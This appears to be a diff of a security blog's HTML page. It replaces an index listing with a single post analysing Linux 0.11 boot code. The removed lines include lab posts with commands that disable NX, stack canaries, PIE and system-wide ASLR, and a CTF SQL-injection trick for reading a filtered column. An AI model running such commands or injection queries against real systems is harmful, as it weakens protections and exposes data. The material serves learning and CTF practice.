@@ -4,20 +4,28 @@
 <head>
   <meta charset="UTF-8">
   
-    <title></title>
+    <title>Linuxv0.11源码分析之引导启动程序一 | </title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="daiker">
     
 
     
-    <meta property="og:type" content="website">
-<meta property="og:title">
-<meta property="og:url" content="http://www.daiker.com.cn/index.html">
+    <meta name="description" content="0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s 0x01 bios做了什么按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linuxv0.11源码分析之引导启动程序一">
+<meta property="og:url" content="http://www.daiker.com.cn/2018/03/19/Linuxv0.11源码分析之引导启动程序一/index.html">
 <meta property="og:site_name">
+<meta property="og:description" content="0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s 0x01 bios做了什么按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-8e0e5dcf8d244507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-e41ee43275a295b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-03-19T05:20:03.323Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title">
+<meta name="twitter:title" content="Linuxv0.11源码分析之引导启动程序一">
+<meta name="twitter:description" content="0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s 0x01 bios做了什么按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5443560-8e0e5dcf8d244507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta name="twitter:creator" content="@daikersec">
 
     
@@ -73,12 +81,10 @@
 </div>
     </header>
     <div id="container">
-      <div id="main">
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
   <h1 itemprop="name">
     
       <a href="/2018/03/19/Linuxv0.11源码分析之引导启动程序一/" title="Linuxv0.11源码分析之引导启动程序一" itemprop="url">Linuxv0.11源码分析之引导启动程序一</a>
@@ -92,9 +98,16 @@
     
   </p>
 </header>
-    <div class="article-content">
-        
-        <h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code></p>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-大体流程"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x5927;&#x4F53;&#x6D41;&#x7A0B;" class="headerlink" title="0x00 &#x5927;&#x4F53;&#x6D41;&#x7A0B;"></a>0x00 &#x5927;&#x4F53;&#x6D41;&#x7A0B;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-bios做了什么"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;" class="headerlink" title="0x01 bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;"></a>0x01 bios&#x505A;&#x4E86;&#x4EC0;&#x4E48;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-将随后的4个扇区加载进内存"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02-&#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;" class="headerlink" title="0x02 &#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;"></a>0x02 &#x5C06;&#x968F;&#x540E;&#x7684;4&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-将后面的240个扇区加载进内存"><span class="toc-number">4.</span> <span class="toc-text"><a href="#0x03-&#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;" class="headerlink" title="0x03 &#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;"></a>0x03 &#x5C06;&#x540E;&#x9762;&#x7684;240&#x4E2A;&#x6247;&#x533A;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-确认下根设备号"><span class="toc-number">5.</span> <span class="toc-text"><a href="#0x04-&#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;" class="headerlink" title="0x04 &#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;"></a>0x04 &#x786E;&#x8BA4;&#x4E0B;&#x6839;&#x8BBE;&#x5907;&#x53F7;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-将程序控制权转交给setup-s"><span class="toc-number">6.</span> <span class="toc-text"><a href="#0x05-&#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup-s" class="headerlink" title="0x05 &#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup.s"></a>0x05 &#x5C06;&#x7A0B;&#x5E8F;&#x63A7;&#x5236;&#x6743;&#x8F6C;&#x4EA4;&#x7ED9;setup.s</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code></p>
 <h2 id="0x01-bios做了什么"><a href="#0x01-bios做了什么" class="headerlink" title="0x01 bios做了什么"></a>0x01 bios做了什么</h2><p>按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。<br>而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。<br>接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000-0x003FF 中断向量表(1kb)</span><br><span class="line">0x00400-0x004FF BIOS数据区(256b)</span><br><span class="line">....</span><br><span class="line">57kb以后-xxxx(8kb)的终端服务程序</span><br></pre></td></tr></table></figure></p>
 <p>接下来bios会触发0x19中断<br>这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存<code>0x07C00</code>处</p>
 <h2 id="0x02-将随后的4个扇区加载进内存"><a href="#0x02-将随后的4个扇区加载进内存" class="headerlink" title="0x02 将随后的4个扇区加载进内存"></a>0x02 将随后的4个扇区加载进内存</h2><p>从入口开始看<br><code>boot/bootsect.s</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">	mov	ax,#BOOTSEG</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov	cx,#256</span><br><span class="line">	sub	si,si</span><br><span class="line">	sub	di,di</span><br><span class="line">	rep</span><br><span class="line">	movw !bootsec</span><br></pre></td></tr></table></figure></p>
@@ -117,14 +130,9 @@
 <h2 id="0x04-确认下根设备号"><a href="#0x04-确认下根设备号" class="headerlink" title="0x04 确认下根设备号"></a>0x04 确认下根设备号</h2><h2 id="0x05-将程序控制权转交给setup-s"><a href="#0x05-将程序控制权转交给setup-s" class="headerlink" title="0x05 将程序控制权转交给setup.s"></a>0x05 将程序控制权转交给setup.s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETUPSEG = 0x9020</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! after that (everyting loaded), we jump to</span><br><span class="line">! the setup-routine loaded directly after</span><br><span class="line">! the bootblock:</span><br><span class="line"></span><br><span class="line">	jmpi	0,SETUPSEG</span><br></pre></td></tr></table></figure>
 <p>前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
+  
+	</div>
+		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 
@@ -137,309 +145,49 @@
 
 
 
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://www.daiker.com.cn/2018/03/19/Linuxv0.11源码分析之引导启动程序一/" data-title="Linuxv0.11源码分析之引导启动程序一 | " data-tsina="5688081717" class="share clearfix">
+	  </div>
+	
+	</div>
 
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2018/03/19/Linuxv0.11源码分析之引导启动程序一/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/19/Linuxv0.11源码分析之引导启动程序一/" data-count-type="comments">&nbsp;</a>
-	
-</div>
 
 </footer>
 
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/03/18/PWN环境搭建/" title="PWN环境搭建" itemprop="url">PWN环境搭建</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
-		
-  <p class="article-time">
-    <time datetime="2018-03-18T07:02:16.000Z" itemprop="datePublished"> Published 2018-03-18</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x00-关闭安全机制"><a href="#0x00-关闭安全机制" class="headerlink" title="0x00 关闭安全机制"></a>0x00 关闭安全机制</h2><p>1.关掉DEP/NX（堆栈不可执行）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -z execstack -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>2.关掉Stack Protector/Canary（栈保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>3.关掉程序ASLR/PIE（程序随机化保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>4.关闭整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su - </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p>
-<p>5.打开整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p>
-<ol>
-<li>64位linux下面的GCC编译出一个32位可执行程序 加参数<code>- m32</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install build-essential module-assistant  </span><br><span class="line">$ sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x01-安装pwntools"><a href="#0x01-安装pwntools" class="headerlink" title="0x01 安装pwntools"></a>0x01 安装pwntools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-安装peda"><a href="#0x02-安装peda" class="headerlink" title="0x02 安装peda"></a>0x02 安装peda</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-绑定端口"><a href="#0x03-绑定端口" class="headerlink" title="0x03 绑定端口"></a>0x03 绑定端口</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号，reuseaddr，fork <span class="built_in">exec</span>:程序位置</span><br></pre></td></tr></table></figure>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/pwn/">pwn</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/pwn/">pwn</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
+   	       
+	</article>
 	
-	  	<span></span>
-		<a href="/2018/03/18/PWN环境搭建/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/18/PWN环境搭建/" data-count-type="comments">&nbsp;</a>
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/03/18/PWN环境搭建/"  title="PWN环境搭建">
+ <strong>下一篇：</strong><br/> 
+ <span>PWN环境搭建
+</span>
+</a>
+</div>
+
+</nav>
+
 	
-</div>
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2018/03/19/Linuxv0.11源码分析之引导启动程序一/" data-title="Linuxv0.11源码分析之引导启动程序一" data-url="http://www.daiker.com.cn/2018/03/19/Linuxv0.11源码分析之引导启动程序一/"></div>
+</section>
 
-</footer>
 
 
-    </article>
 
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/03/15/解决msf内存不足不能启动的问题/" title="解决msf内存不足不能启动的问题" itemprop="url">解决msf内存不足不能启动的问题</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
-		
-  <p class="article-time">
-    <time datetime="2018-03-15T06:50:54.000Z" itemprop="datePublished"> Published 2018-03-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h2><p>在vps里面跑msf，经常遇到内存不足，提示如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM)</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos;</span><br></pre></td></tr></table></figure></p>
-<p>内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案</p>
-<h2 id="0x01-解决方案"><a href="#0x01-解决方案" class="headerlink" title="0x01 解决方案"></a>0x01 解决方案</h2><p>vps默认安装的时候是没有安装swap分区的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# top</span><br><span class="line">top - 06:35:36 up 14:57,  2 users,  load average: 0.21, 0.09, 0.07</span><br><span class="line">Tasks:  86 total,   1 running,  85 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.5 us,  0.0 sy,  0.0 ni, 99.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1016108 total,   240924 free,   518952 used,   256232 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.   247996 avail Mem</span><br></pre></td></tr></table></figure></p>
-<p>我们可以给分配一个swap分区,命令如下</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=/home/swap bs=1024 count=512000</span><br><span class="line">/sbin/mkswap /home/swap</span><br><span class="line">/sbin/swapon /home/swap</span><br></pre></td></tr></table></figure>
-<p>然后查看swap分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           992M        506M         74M         92M        411M        242M</span><br><span class="line">Swap:          499M          0B        499M</span><br></pre></td></tr></table></figure></p>
-<p>msf成功开启</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/tools/">tools</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/Linux/">Linux</a><a href="/tags/Kali/">Kali</a><a href="/tags/tools/">tools</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2018/03/15/解决msf内存不足不能启动的问题/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/15/解决msf内存不足不能启动的问题/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/03/12/CTF中SQL注入字段名被过滤小技巧/" title="CTF中SQL注入字段名被过滤小技巧" itemprop="url">CTF中SQL注入字段名被过滤小技巧</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
-		
-  <p class="article-time">
-    <time datetime="2018-03-12T03:04:07.000Z" itemprop="datePublished"> Published 2018-03-12</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来</p>
-<h1 id="0x01-问题引入"><a href="#0x01-问题引入" class="headerlink" title="0x01 问题引入"></a>0x01 问题引入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| points | flag      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| 31     | daiker666 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。</p>
-<h1 id="0x02-问题思考"><a href="#0x02-问题思考" class="headerlink" title="0x02 问题思考"></a>0x02 问题思考</h1><p>常规的查询是<code>select flag from users</code>,如果我要在们的查询语句中不见到<code>flag</code>，就得把<code>flag</code>这个列设置别名，mysql设置列别名有两种方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag as haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (flag)haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>但是这样我们还会出现flag这个字段。这时候想到这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select * from users;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p>
-<p>这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1,2 union select * from users)c;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
-<p>然后提取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;</span><br><span class="line">+-----------+</span><br><span class="line">| 2         |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/注入/">注入</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/CTF/">CTF</a><a href="/tags/注入/">注入</a><a href="/tags/web/">web</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2018/03/12/CTF中SQL注入字段名被过滤小技巧/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/12/CTF中SQL注入字段名被过滤小技巧/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/02/15/happyMoctf-ping一下好吗WP/" title="happyMoctf-ping一下好吗WP" itemprop="url">happyMoctf-ping一下好吗WP</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
-		
-  <p class="article-time">
-    <time datetime="2018-02-15T10:39:15.000Z" itemprop="datePublished"> Published 2018-02-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
